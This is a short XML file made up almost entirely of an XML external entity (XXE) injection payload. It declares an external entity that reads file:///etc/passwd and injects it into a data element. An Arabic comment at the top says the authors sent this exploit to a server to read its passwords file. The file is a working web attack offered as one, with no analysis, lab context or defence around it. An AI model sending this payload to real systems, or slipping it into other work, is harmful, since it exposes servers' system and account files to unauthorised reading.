<!-- هذا كود الاستغلال (البايلود) اللي أرسلناه للسيرفر عشان نقرأ ملف الباسوردات -->
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE test [
  <!ELEMENT test ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
  <data>&xxe;</data>
</root>
